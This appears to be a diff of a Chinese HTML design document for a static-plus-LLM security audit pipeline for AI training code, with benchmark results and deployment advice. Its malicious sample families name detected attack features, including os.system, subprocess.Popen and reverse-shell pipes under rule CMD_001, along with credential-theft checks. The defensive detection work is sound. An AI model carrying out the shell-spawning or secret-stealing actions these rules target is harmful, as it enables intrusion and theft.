+                <text x="14" y="24" fill="#5dbd8f" font-size="12" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">精确仲裁放行 / 拦截</text>
+                <text x="14" y="42" fill="#c9d1d9" font-size="10"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">确认真实攻击 · <strong
+                    style="color:#5dbd8f;">纠正配置/日志良性误杀</strong></text>
               </g>
 
               <!-- 箭头: 歧义/混淆 -> Fail-Closed 门禁 -->
-              <path d="M 640 258 L 685 258" stroke="#e0a14b" stroke-width="2"/>
-              <polygon points="685,253 695,258 685,263" fill="#e0a14b"/>
+              <path d="M 640 258 L 685 258" stroke="#e0a14b" stroke-width="2" />
+              <polygon points="685,253 695,258 685,263" fill="#e0a14b" />
 
               <!-- 兜底门禁终点 -->
               <g transform="translate(695, 236)">
-                <rect width="195" height="52" rx="8" fill="#2b1f14" stroke="#d29922" stroke-width="1.5"/>
-                <text x="14" y="23" fill="#e0a14b" font-size="12" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Fail-Closed 严格门禁</text>
-                <text x="14" y="42" fill="#c9d1d9" font-size="10" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">大模型故障/超时 · <strong style="color:#e0a14b;">维持阻断 0 漏报</strong></text>
+                <rect width="195" height="52" rx="8" fill="#2b1f14" stroke="#d29922" stroke-width="1.5" />
+                <text x="14" y="23" fill="#e0a14b" font-size="12" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Fail-Closed 严格门禁</text>
+                <text x="14" y="42" fill="#c9d1d9" font-size="10"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">大模型故障/超时 · <strong
+                    style="color:#e0a14b;">维持阻断 0 漏报</strong></text>
               </g>
             </svg>
           </figure>
@@ -4052,7 +4783,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               </div>
               <p class="flow-qa-desc">
                 <strong>答：在纯 LLM 方案中，模型无法感知哪些代码是纯净的，必须对全部工程源码进行无差别端到端推理。</strong><br>
-                一个常规 AI 训练工程通常包含 8~20 个源码文件。纯 LLM 盲审必须发起 800+ 次完整推理，在 100 样本评测集上耗时高达数千至数万秒（0.5B 需 7,680 秒，7B 超过 10 小时！）。而在动静协同方案中，<strong>50% 的纯净代码在 Stage 1 静态零命中后毫秒级直接放行，算力开销直接削减 50%</strong>。
+                一个常规 AI 训练工程通常包含 8~20 个源码文件。纯 LLM 盲审必须发起 800+ 次完整推理，在 100 样本评测集上耗时高达数千至数万秒（0.5B 需 7,680 秒，7B 超过 10
+                小时！）。而在动静协同方案中，<strong>50% 的纯净代码在 Stage 1 静态零命中后毫秒级直接放行，算力开销直接削减 50%</strong>。
               </p>
             </div>
 
@@ -4063,7 +4795,9 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               </div>
               <p class="flow-qa-desc">
                 <strong>答：行级规则锚点提供了精准的先验语义约束，杜绝了无目标盲审下的过度警惕。</strong><br>
-                纯 LLM 面对长达百行的复杂 Python 代码时，极易对 <code>os.environ.get</code> 或 <code>logging.info</code> 产生过激反应，将正常的模型权重初始化判定为窃密通道（0.5B 纯盲审误报 27 例）。动静协同通过精准截取违规点上下 7 行与规则元数据（如 <code>ENV_001</code>），使大模型能够集中注意力评估具体的局部数据流，成功消除 60%~75% 的良性误杀。
+                纯 LLM 面对长达百行的复杂 Python 代码时，极易对 <code>os.environ.get</code> 或 <code>logging.info</code>
+                产生过激反应，将正常的模型权重初始化判定为窃密通道（0.5B 纯盲审误报 27 例）。动静协同通过精准截取违规点上下 7 行与规则元数据（如
+                <code>ENV_001</code>），使大模型能够集中注意力评估具体的局部数据流，成功消除 60%~75% 的良性误杀。
               </p>
             </div>
 
@@ -4074,14 +4808,16 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               </div>
               <p class="flow-qa-desc">
                 <strong>答：当硬件资源受限（如 7.4GB 内存无法承载 9.0GB 权重）时，动静协同展现出极强的架构韧性。</strong><br>
-                纯 LLM 方案在发生超时后若不兜底，将陷入全量放行（安全彻底失守）或全量阻断（业务完全不可用）的两难。而动静协同架构下，<strong>50% 的确定性纯净代码依然能够正常运行，只有触发静态告警的可疑代码在 LLM 超时后维持阻断</strong>，在守死安全红线的同时最大化保全了生产业务。
+                纯 LLM 方案在发生超时后若不兜底，将陷入全量放行（安全彻底失守）或全量阻断（业务完全不可用）的两难。而动静协同架构下，<strong>50% 的确定性纯净代码依然能够正常运行，只有触发静态告警的可疑代码在
+                  LLM 超时后维持阻断</strong>，在守死安全红线的同时最大化保全了生产业务。
               </p>
             </div>
           </div>
         </div>
 
         <!-- 10 大对抗家族攻防细分透视网格 -->
-        <h3 style="margin-top: 26px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
+        <h3
+          style="margin-top: 26px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
           <span>🎯</span> 10 大对抗家族攻防细分透视 (Benign B1~B5 vs Malicious M1~M5)
         </h3>
         <p style="font-size: 13px; color: var(--muted); margin: 0 0 14px;">
@@ -4097,7 +4833,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
             </div>
             <p style="font-size: 12px; color: var(--text); margin: 0; line-height: 1.55;">
               <strong>测试场景：</strong>调整代码缩进、增加长段技术注释、重命名非敏感变量。<br>
-              <strong>方案对比：</strong>纯 LLM 盲审因长文本注意力涣散偶发误杀（0.5B 误报 2 例）；动静协同静态层 0 命中，10 例<strong>全部实现 100% 毫秒级零算力旁路放行</strong>。
+              <strong>方案对比：</strong>纯 LLM 盲审因长文本注意力涣散偶发误杀（0.5B 误报 2 例）；动静协同静态层 0 命中，10 例<strong>全部实现 100%
+                毫秒级零算力旁路放行</strong>。
             </p>
           </div>
 
@@ -4109,7 +4846,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
             </div>
             <p style="font-size: 12px; color: var(--text); margin: 0; line-height: 1.55;">
               <strong>测试场景：</strong>合规训练脚本在异常时打印 <code>logger.info(key_id)</code>，读取非敏感环境变量。<br>
-              <strong>方案对比：</strong>静态正则触发 <code>key_pattern</code> 产生严重误杀；动静协同通过 7 行行级上下文，Qwen 模型准确定位 <code>key_id</code> 为整型计数器，<strong>成功修正放行 6 例误报</strong>。
+              <strong>方案对比：</strong>静态正则触发 <code>key_pattern</code> 产生严重误杀；动静协同通过 7 行行级上下文，Qwen 模型准确定位
+              <code>key_id</code> 为整型计数器，<strong>成功修正放行 6 例误报</strong>。
             </p>
           </div>
 
@@ -4121,7 +4859,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
             </div>
             <p style="font-size: 12px; color: var(--text); margin: 0; line-height: 1.55;">
               <strong>测试场景：</strong>使用 <code>open()</code> 加载本地验证集、解析 YAML 超参数。<br>
-              <strong>方案对比：</strong>纯 LLM 容易将频繁的文件读取误判为敏感凭证窃取；动静协同中大模型通过 <code>FIL_001</code> 规则锚定，识别其为常规数据集 IO，放行合规训练任务。
+              <strong>方案对比：</strong>纯 LLM 容易将频繁的文件读取误判为敏感凭证窃取；动静协同中大模型通过 <code>FIL_001</code> 规则锚定，识别其为常规数据集
+              IO，放行合规训练任务。
             </p>
           </div>
 
@@ -4145,7 +4884,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
             </div>
             <p style="font-size: 12px; color: var(--text); margin: 0; line-height: 1.55;">
               <strong>测试场景：</strong>封装 CLI 参数解析、阶段执行器（phase wrapper）。<br>
-              <strong>方案对比：</strong>纯 LLM 在代码体积扩大后推理时延飙升；动静协同因无危险调用，<strong>全部 0 Finding 快速旁路通过</strong>，完全不占 GPU/CPU 推理资源。
+              <strong>方案对比：</strong>纯 LLM 在代码体积扩大后推理时延飙升；动静协同因无危险调用，<strong>全部 0 Finding 快速旁路通过</strong>，完全不占 GPU/CPU
+              推理资源。
             </p>
           </div>
 
@@ -4157,7 +4897,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
             </div>
             <p style="font-size: 12px; color: var(--text); margin: 0; line-height: 1.55;">
               <strong>攻击特征：</strong>通过 <code>os.system</code>、<code>subprocess.Popen</code> 或反弹 Shell 管道。<br>
-              <strong>方案对比：</strong>纯 LLM 对跨行拆分调用偶有遗漏；动静协同由静态正则 <code>CMD_001</code> 锁定入口，结合文件级 Prompt 确认外联意图，<strong>检出率高达 96%~100%</strong>。
+              <strong>方案对比：</strong>纯 LLM 对跨行拆分调用偶有遗漏；动静协同由静态正则 <code>CMD_001</code> 锁定入口，结合文件级 Prompt
+              确认外联意图，<strong>检出率高达 96%~100%</strong>。
             </p>
           </div>
 
@@ -4211,7 +4952,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
         </div>
 
         <!-- 生产环境选型推荐与 ROI 决策矩阵 -->
-        <h3 style="margin-top: 26px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
+        <h3
+          style="margin-top: 26px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
           <span>🎯</span> 生产环境部署 ROI 决策矩阵与模型推荐
         </h3>
         <p style="font-size: 13px; color: var(--muted); margin: 0 0 14px;">
@@ -4301,13 +5043,13 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
         </div>
       </section>
 
-        <div class="footer" style="margin-top: 24px;">
-          文档定位：独立技术设计稿 · 同时承载 TAA 审计闭环、benchmark 设计与实测结果。
-          <div class="footnotes">
-            <div class="note"><b>写作原则：</b>工程事实优先，判断结论明确，所有推荐都能回指到现有文档依据。</div>
-            <div class="note"><b>设计判断：</b>当前链路是“足够正确但还不够可治理”，补齐治理层后就能稳定承载后续迭代。</div>
-          </div>
+      <div class="footer" style="margin-top: 24px;">
+        文档定位：独立技术设计稿 · 同时承载 TAA 审计闭环、benchmark 设计与实测结果。
+        <div class="footnotes">
+          <div class="note"><b>写作原则：</b>工程事实优先，判断结论明确，所有推荐都能回指到现有文档依据。</div>
+          <div class="note"><b>设计判断：</b>当前链路是“足够正确但还不够可治理”，补齐治理层后就能稳定承载后续迭代。</div>
         </div>
-      </main>
+      </div>
+    </main>
   </div>
 </div>
